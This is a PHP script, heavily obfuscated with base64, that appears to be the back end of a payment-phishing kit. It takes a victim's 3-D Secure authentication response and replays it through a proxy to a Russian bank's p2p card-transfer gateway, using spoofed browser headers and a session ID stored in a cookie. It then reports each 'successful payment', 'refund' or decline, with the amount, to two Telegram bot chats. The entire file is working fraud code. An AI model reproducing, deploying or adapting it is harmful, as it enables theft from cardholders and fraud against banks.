<?php 
if (isset($_POST[base64_decode('UGFSZXM=')]) && isset($_POST[base64_decode('TUQ=')])) {
    
        include base64_decode('Y29uZmlnLnBocA==');
        
        $aa = json_decode(base64_decode($_COOKIE[base64_decode('c2V0')]),1);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => $aa[base64_decode('dXJs')],
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => base64_decode('UE9TVA=='),
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => base64_decode('TUQ9').$_POST[base64_decode('TUQ=')].base64_decode('JlBhUmVzPQ==').urlencode($_POST[base64_decode('UGFSZXM=')]),
        CURLOPT_HTTPHEADER => array(base64_decode('Q29va2llOiB1YnJyX2NpdHk9MjsgSlNFU1NJT05JRD0=').$aa[base64_decode('c2Vzcw==')].base64_decode('OyBsaWQ9ZDdlZDZkYTI4ODZjMDhhYjEyZjczMjZiNjlkZTc1OTY='),base64_decode('SG9zdDogdHdwZy51YnJyLnJ1'),base64_decode('T3JpZ2luOiBodHRwczovL3AycC51YnJyLnJ1'),base64_decode('UmVmZXJlcjogaHR0cHM6Ly9wMnAudWJyci5ydS90cmFuc2ZlcmluZGV4bmV3LmpzcA=='),base64_decode('VXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc5LjAuMzk0NS44OCBTYWZhcmkvNTM3LjM2'),)
        ]);
        $snd = (curl_exec($curl));
        curl_close($curl);
        
        preg_match_all(base64_decode('IzxpbnB1dCBuYW1lPSJtcGl4bWwiIHR5cGU9ImhpZGRlbiIgdmFsdWU9IiguKz8pIiNpcw=='), $snd, $mpixml);
        preg_match_all(base64_decode('IzxpbnB1dCBuYW1lPSJCclhtbCIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iKC4rPykiI2lz'), $snd, $BrXml);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => base64_decode('aHR0cHM6Ly90d3BnLnVicnIucnUvbXBpcnVuLmpzcD9hY3Rpb249bXBp'),
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => base64_decode('UE9TVA=='),
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => base64_decode('bXBpeG1sPQ==').urlencode($mpixml[1][0]).base64_decode('JkJyWG1sPQ==').$BrXml[1][0],
        CURLOPT_HTTPHEADER => array(base64_decode('Q29va2llOiB1YnJyX2NpdHk9MjsgSlNFU1NJT05JRD0=').$aa[base64_decode('c2Vzcw==')].base64_decode('OyBsaWQ9ZDdlZDZkYTI4ODZjMDhhYjEyZjczMjZiNjlkZTc1OTY='),base64_decode('SG9zdDogdHdwZy51YnJyLnJ1'),base64_decode('T3JpZ2luOiBodHRwczovL3R3cGcudWJyci5ydQ=='),base64_decode('UmVmZXJlcjogaHR0cHM6Ly90d3BnLnVicnIucnUvTVBJL1Jlc3BvbnNlUHJvY2Vzc2luZy5qc3A='),base64_decode('VXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc5LjAuMzk0NS44OCBTYWZhcmkvNTM3LjM2'),)
        ]);
        $check = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all(base64_decode('IzxPcmRlclN0YXR1cz4oLis/KTwjaXM='), $check, $mess);
        preg_match_all(base64_decode('IzxSZXNwb25zZURlc2NyaXB0aW9uPiguKz8pPCNpcw=='), $check, $err);
        
        
               if ($mess[1][0]!='DECLINED'){
    if ($_COOKIE['voz']){
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode("❗️Успешный Возврат ЗИНК❗️Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode("❗️Успешный Возврат ЗИНК❗️Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
    } else {
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode("❗️Успешная Оплата❗️Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode("❗️Успешная Оплата❗️Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
    }
    setcookie(base64_decode('dm96'), 0, 0);
    header(base64_decode('TG9jYXRpb246IA==') . $success_url);
            } else {
    file_get_contents(base64_decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==').$token.base64_decode('L3NlbmRNZXNzYWdlP2NoYXRfaWQ9').$chatid.base64_decode('JnRleHQ9').urlencode(base64_decode('PGI+0J7RiNC40LHQutCwOiA=').$err[1][0].base64_decode('CtCh0YPQvNC80LA6IA==').$_COOKIE[base64_decode('YW1vdW50')].base64_decode('INGA0YPQsS48L2I+')).base64_decode('JnBhcnNlX21vZGU9aHRtbA=='));
  file_get_contents(base64_decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==').$wtoken.base64_decode('L3NlbmRNZXNzYWdlP2NoYXRfaWQ9').$wchatid.base64_decode('JnRleHQ9').urlencode(base64_decode('PGI+0J7RiNC40LHQutCwOiA=').$err[1][0].base64_decode('CtCh0YPQvNC80LA6IA==').$_COOKIE[base64_decode('YW1vdW50')].base64_decode('INGA0YPQsS48L2I+')).base64_decode('JnBhcnNlX21vZGU9aHRtbA=='));
    header(base64_decode('TG9jYXRpb246IA==') . $fail_url);
        }
} else header(base64_decode('SFRUUC8xLjEgNDAxIFVuYXV0aG9yaXplZA=='));

?>